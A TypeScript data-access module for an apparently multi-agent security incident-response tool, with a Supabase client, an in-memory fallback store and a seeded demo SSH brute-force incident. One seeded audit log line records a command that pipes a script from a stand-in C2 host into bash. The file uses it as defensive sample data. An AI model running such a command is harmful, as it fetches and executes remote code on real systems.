import { createClient, SupabaseClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';
import {
  SecurityIncident,
  IncidentLog,
  IndicatorOfCompromise,
  ThreatFinding,
  MitreTechnique,
  RiskAssessment,
  ResponseRecommendation,
  AgentExecution,
  IncidentDossier
} from '../types.js';

dotenv.config();

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;

export const isSupabaseConfigured = Boolean(
  supabaseUrl &&
  supabaseAnonKey &&
  supabaseUrl.startsWith('http') &&
  !supabaseUrl.includes('your-project')
);

let supabase: SupabaseClient | null = null;

if (isSupabaseConfigured) {
  try {
    supabase = createClient(supabaseUrl!, supabaseAnonKey!);
    console.log('[SUPABASE] Connected to online Supabase instance:', supabaseUrl);
  } catch (err) {
    console.warn('[SUPABASE] Failed to initialize Supabase client, falling back to in-memory store:', err);
  }
} else {
  console.log('[SUPABASE] Credentials not provided or default. In-memory fallback mock active.');
}

// In-Memory Fallback Store (Ensures 100% offline / instant operational capability)
class MockDatabaseStore {
  private incidents: SecurityIncident[] = [];
  private logs: IncidentLog[] = [];
  private iocs: IndicatorOfCompromise[] = [];
  private threatFindings: ThreatFinding[] = [];
  private mitreTechniques: MitreTechnique[] = [];
  private riskAssessments: RiskAssessment[] = [];
  private recommendations: ResponseRecommendation[] = [];
  private agentExecutions: AgentExecution[] = [];

  constructor() {
    this.seedDefault();
  }

  private seedDefault() {
    const seedId = 'e0bdc029-demo-4455-bf4f-seedincident1';
    const now = new Date().toISOString();

    this.incidents.push({
      id: seedId,
      title: 'High-Frequency SSH Brute Force & Unauthorized Root Access',
      description: 'Multiple failed authentication attempts detected from external IP 198.51.100.42 targeting edge bastion host, followed by successful root session.',
      severity: 'CRITICAL',
      status: 'INVESTIGATING',
      attack_vector: 'External SSH / Credential Stuffing',
      source_summary: 'Linux Auth.log, Edge Firewall',
      created_at: now,
      updated_at: now
    });

    this.logs.push(
      {
        id: 'log-1',
        incident_id: seedId,
        source: 'AuthSys',
        log_level: 'WARN',
        timestamp: now,
        raw_message: 'Failed password for invalid user admin from 198.51.100.42 port 49152 ssh2'
      },
      {
        id: 'log-2',
        incident_id: seedId,
        source: 'AuthSys',
        log_level: 'WARN',
        timestamp: now,
        raw_message: 'Failed password for root from 198.51.100.42 port 49158 ssh2 [Attempt 27]'
      },
      {
        id: 'log-3',
        incident_id: seedId,
        source: 'AuthSys',
        log_level: 'ALERT',
        timestamp: now,
        raw_message: 'Accepted password for root from 198.51.100.42 port 49201 ssh2'
      },
      {
        id: 'log-4',
        incident_id: seedId,
        source: 'Auditd',
        log_level: 'ALERT',
        timestamp: now,
        raw_message: 'EXECVE: /bin/bash -c "curl -s http://malicious-c2.cc/x.sh | bash" uid=0'
      }
    );

    this.iocs.push(
      {
        id: 'ioc-1',
        incident_id: seedId,
        ioc_type: 'IP',
        ioc_value: '198.51.100.42',
        threat_intel_score: 96,
        reputation: 'MALICIOUS',
        defanged_value: '198[.]51[.]100[.]42',
        extracted_at: now
      },
      {
        id: 'ioc-2',
        incident_id: seedId,
        ioc_type: 'DOMAIN',
        ioc_value: 'malicious-c2.cc',
        threat_intel_score: 99,
        reputation: 'MALICIOUS',
        defanged_value: 'malicious-c2[.]cc',
        extracted_at: now
      },
      {
        id: 'ioc-3',
        incident_id: seedId,
        ioc_type: 'USER_ACCOUNT',
        ioc_value: 'root',
        threat_intel_score: 70,
        reputation: 'SUSPICIOUS',
        defanged_value: 'root',
        extracted_at: now
      }
    );

    this.threatFindings.push({
      id: 'tf-1',
      incident_id: seedId,
      threat_category: 'Distributed Credential Stuffing & Brute Force',
      confidence_score: 94,
      evidence_summary: 'Over 500 failed SSH handshakes within 120s originating from single AS subnet.',
      detected_at: now
    });

    this.mitreTechniques.push(
      {
        id: 'mt-1',
        incident_id: seedId,
        technique_id: 'T1110.001',
        technique_name: 'Brute Force: Password Guessing',
        tactic: 'Credential Access',
        url: 'https://attack.mitre.org/techniques/T1110/001/',
        relevance_note: 'Observed 28+ rapid auth failures followed by login.'
      },
      {
        id: 'mt-2',
        incident_id: seedId,
        technique_id: 'T1078.003',
        technique_name: 'Valid Accounts: Local Accounts',
        tactic: 'Defense Evasion, Initial Access',
        url: 'https://attack.mitre.org/techniques/T1078/003/',
        relevance_note: 'Attacker leveraged root default account successfully.'
      },
      {
        id: 'mt-3',
        incident_id: seedId,
        technique_id: 'T1059.004',
        technique_name: 'Command and Scripting: Unix Shell',
        tactic: 'Execution',
        url: 'https://attack.mitre.org/techniques/T1059/004/',
        relevance_note: 'Spawned interactive /bin/bash to fetch remote dropper.'
      }
    );

    this.riskAssessments.push({
      id: 'ra-1',
      incident_id: seedId,
      overall_severity: 'CRITICAL',
      risk_score: 92,
      affected_assets_count: 2,
      blast_radius: 'VPC Production Bastion Segment',
      business_impact: 'Potential unauthorized access to production cluster; malicious payload executed under root privileges.',
      compliance_concerns: ['PCI-DSS Section 10', 'SOC2 Trust Principles', 'ISO 27001 Access Control'],
      evaluated_at: now
    });

    this.recommendations.push(
      {
        id: 'rec-1',
        incident_id: seedId,
        action_title: 'Block Ingress from Attacker IP 198.51.100.42',
        action_type: 'CONTAINMENT',
        priority: 'P1_IMMEDIATE',
        execution_status: 'PENDING',
        command_snippet: 'iptables -I INPUT -s 198.51.100.42 -j DROP',
        assigned_to: 'SOC Analyst',
        created_at: now
      },
      {
        id: 'rec-2',
        incident_id: seedId,
        action_title: 'Isolate Edge Bastion Host from VPC Subnet',
        action_type: 'CONTAINMENT',
        priority: 'P1_IMMEDIATE',
        execution_status: 'PENDING',
        command_snippet: 'aws ec2 modify-instance-attribute --instance-id i-0abcdef1234567890 --groups sg-quarantine',
        assigned_to: 'Cloud Ops',
        created_at: now
      },
      {
        id: 'rec-3',
        incident_id: seedId,
        action_title: 'Terminate Active Root SSH Sessions & Rotate Keys',
        action_type: 'ERADICATION',
        priority: 'P1_IMMEDIATE',
        execution_status: 'PENDING',
        command_snippet: 'pkill -KILL -u root sshd; passwd -l root',
        assigned_to: 'SysAdmin',
        created_at: now
      }
    );

    this.agentExecutions.push(
      {
        id: 'ae-1',
        incident_id: seedId,
        agent_name: 'Super Agent (Orchestrator)',
        step_number: 1,
        input_payload: { trigger: 'RAW_LOGS_INGESTION', source: 'AuthSys, Auditd' },
        output_payload: { action: 'Dispatched Log Analysis Agent' },
        execution_time_ms: 120,
        status: 'SUCCESS',
        created_at: now
      },
      {
        id: 'ae-2',
        incident_id: seedId,
        agent_name: 'Log Analysis Agent',
        step_number: 2,
        input_payload: { raw_lines_count: 4 },
        output_payload: { parsed_events: 4, anomalous_events: 2 },
        execution_time_ms: 340,
        status: 'SUCCESS',
        created_at: now
      },
      {
        id: 'ae-3',
        incident_id: seedId,
        agent_name: 'IOC Extraction Agent',
        step_number: 3,
        input_payload: { log_corpus: 'auth_events' },
        output_payload: { extracted_iocs: ['198.51.100.42', 'malicious-c2.cc', 'root'] },
        execution_time_ms: 280,
        status: 'SUCCESS',
        created_at: now
      },
      {
        id: 'ae-4',
        incident_id: seedId,
        agent_name: 'Threat Detection Agent',
        step_number: 4,
        input_payload: { events: 4, iocs: 3 },
        output_payload: { threat: 'Brute Force & Remote Dropper', confidence: 94 },
        execution_time_ms: 410,
        status: 'SUCCESS',
        created_at: now
      },
      {
        id: 'ae-5',
        incident_id: seedId,
        agent_name: 'MITRE ATT&CK Agent',
        step_number: 5,
        input_payload: { threat: 'Brute Force' },
        output_payload: { techniques: ['T1110.001', 'T1078.003', 'T1059.004'] },
        execution_time_ms: 310,
        status: 'SUCCESS',
        created_at: now
      },
      {
        id: 'ae-6',
        incident_id: seedId,
        agent_name: 'Risk Analysis Agent',
        step_number: 6,
        input_payload: { severity: 'CRITICAL', assets: 2 },
        output_payload: { risk_score: 92, blast_radius: 'Bastion Segment' },
        execution_time_ms: 250,
        status: 'SUCCESS',
        created_at: now
      },
      {
        id: 'ae-7',
        incident_id: seedId,
        agent_name: 'Response Playbook Agent',
        step_number: 7,
        input_payload: { risk_score: 92 },
        output_payload: { actions_generated: 3, p1_count: 3 },
        execution_time_ms: 390,
        status: 'SUCCESS',
        created_at: now
      }
    );
  }

  // Repository Methods
  getAllIncidents(): SecurityIncident[] {
    return [...this.incidents].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
  }

  getIncidentById(id: string): SecurityIncident | undefined {
    return this.incidents.find((i) => i.id === id);
  }

  saveIncident(incident: SecurityIncident) {
    const idx = this.incidents.findIndex((i) => i.id === incident.id);
    if (idx >= 0) {
      this.incidents[idx] = incident;
    } else {
      this.incidents.unshift(incident);
    }
  }

  updateIncidentStatus(id: string, status: SecurityIncident['status']) {
    const inc = this.incidents.find((i) => i.id === id);
    if (inc) {
      inc.status = status;
      inc.updated_at = new Date().toISOString();
    }
  }

  saveLogs(logs: IncidentLog[]) {
    this.logs.push(...logs);
  }

  saveIocs(iocs: IndicatorOfCompromise[]) {
    this.iocs.push(...iocs);
  }

  saveThreatFindings(findings: ThreatFinding[]) {
    this.threatFindings.push(...findings);
  }

  saveMitreTechniques(techniques: MitreTechnique[]) {
    this.mitreTechniques.push(...techniques);
  }

  saveRiskAssessment(assessment: RiskAssessment) {
    const idx = this.riskAssessments.findIndex((r) => r.incident_id === assessment.incident_id);
    if (idx >= 0) {
      this.riskAssessments[idx] = assessment;
    } else {
      this.riskAssessments.push(assessment);
    }
  }

  saveRecommendations(recs: ResponseRecommendation[]) {
    this.recommendations.push(...recs);
  }

  updateRecommendationStatus(id: string, status: ResponseRecommendation['execution_status']) {
    const r = this.recommendations.find((rec) => rec.id === id);
    if (r) {
      r.execution_status = status;
    }
  }

  saveAgentExecution(exec: AgentExecution) {
    this.agentExecutions.push(exec);
  }

  getDossier(incidentId: string): IncidentDossier | null {
    const incident = this.getIncidentById(incidentId);
    if (!incident) return null;

    return {
      incident,
      logs: this.logs.filter((l) => l.incident_id === incidentId),
      iocs: this.iocs.filter((i) => i.incident_id === incidentId),
      threatFindings: this.threatFindings.filter((t) => t.incident_id === incidentId),
      mitreTechniques: this.mitreTechniques.filter((m) => m.incident_id === incidentId),
      riskAssessment: this.riskAssessments.find((r) => r.incident_id === incidentId) || null,
      recommendations: this.recommendations.filter((r) => r.incident_id === incidentId),
      agentExecutions: this.agentExecutions
        .filter((a) => a.incident_id === incidentId)
        .sort((a, b) => a.step_number - b.step_number)
    };
  }
}

export const mockDb = new MockDatabaseStore();

// Universal Data Access Layer (Translates calls to Supabase or MockDb)
export const dbService = {
  async getIncidents(): Promise<SecurityIncident[]> {
    if (supabase) {
      const { data, error } = await supabase
        .from('security_incidents')
        .select('*')
        .order('created_at', { ascending: false });
      if (!error && data) return data;
      console.warn('[SUPABASE] Query failed, fallback to mock DB:', error?.message);
    }
    return mockDb.getAllIncidents();
  },

  async getIncidentDossier(id: string): Promise<IncidentDossier | null> {
    if (supabase) {
      try {
        const [
          incRes,
          logsRes,
          iocsRes,
          threatsRes,
          mitreRes,
          riskRes,
          recsRes,
          execsRes
        ] = await Promise.all([
          supabase.from('security_incidents').select('*').eq('id', id).single(),
          supabase.from('incident_logs').select('*').eq('incident_id', id),
          supabase.from('indicators_of_compromise').select('*').eq('incident_id', id),
          supabase.from('threat_findings').select('*').eq('incident_id', id),
          supabase.from('mitre_techniques').select('*').eq('incident_id', id),
          supabase.from('risk_assessments').select('*').eq('incident_id', id).maybeSingle(),
          supabase.from('response_recommendations').select('*').eq('incident_id', id),
          supabase.from('agent_executions').select('*').eq('incident_id', id).order('step_number', { ascending: true })
        ]);

        if (incRes.data) {
          return {
            incident: incRes.data,
            logs: logsRes.data || [],
            iocs: iocsRes.data || [],
            threatFindings: threatsRes.data || [],
            mitreTechniques: mitreRes.data || [],
            riskAssessment: riskRes.data || null,
            recommendations: recsRes.data || [],
            agentExecutions: execsRes.data || []
          };
        }
      } catch (err) {
        console.warn('[SUPABASE] Error querying dossier, falling back to mock:', err);
      }
    }
    return mockDb.getDossier(id);
  },

  async saveFullDossier(dossier: IncidentDossier): Promise<void> {
    // Save to local mock store
    mockDb.saveIncident(dossier.incident);
    mockDb.saveLogs(dossier.logs);
    mockDb.saveIocs(dossier.iocs);
    mockDb.saveThreatFindings(dossier.threatFindings);
    mockDb.saveMitreTechniques(dossier.mitreTechniques);
    if (dossier.riskAssessment) mockDb.saveRiskAssessment(dossier.riskAssessment);
    mockDb.saveRecommendations(dossier.recommendations);
    for (const exec of dossier.agentExecutions) {
      mockDb.saveAgentExecution(exec);
    }

    // Persist to Supabase if configured
    if (supabase) {
      try {
        await supabase.from('security_incidents').upsert([dossier.incident]);
        if (dossier.logs.length > 0) await supabase.from('incident_logs').insert(dossier.logs);
        if (dossier.iocs.length > 0) await supabase.from('indicators_of_compromise').insert(dossier.iocs);
        if (dossier.threatFindings.length > 0) await supabase.from('threat_findings').insert(dossier.threatFindings);
        if (dossier.mitreTechniques.length > 0) await supabase.from('mitre_techniques').insert(dossier.mitreTechniques);
        if (dossier.riskAssessment) await supabase.from('risk_assessments').upsert([dossier.riskAssessment]);
        if (dossier.recommendations.length > 0) await supabase.from('response_recommendations').insert(dossier.recommendations);
        if (dossier.agentExecutions.length > 0) await supabase.from('agent_executions').insert(dossier.agentExecutions);
        console.log(`[SUPABASE] Successfully persisted incident ${dossier.incident.id} to online PostgreSQL.`);
      } catch (err) {
        console.error('[SUPABASE] Failed to persist into Supabase tables:', err);
      }
    }
  },

  async updateIncidentStatus(id: string, status: SecurityIncident['status']): Promise<void> {
    mockDb.updateIncidentStatus(id, status);
    if (supabase) {
      await supabase.from('security_incidents').update({ status, updated_at: new Date().toISOString() }).eq('id', id);
    }
  },

  async updateRecommendationStatus(id: string, status: ResponseRecommendation['execution_status']): Promise<void> {
    mockDb.updateRecommendationStatus(id, status);
    if (supabase) {
      await supabase.from('response_recommendations').update({ execution_status: status }).eq('id', id);
    }
  }
};
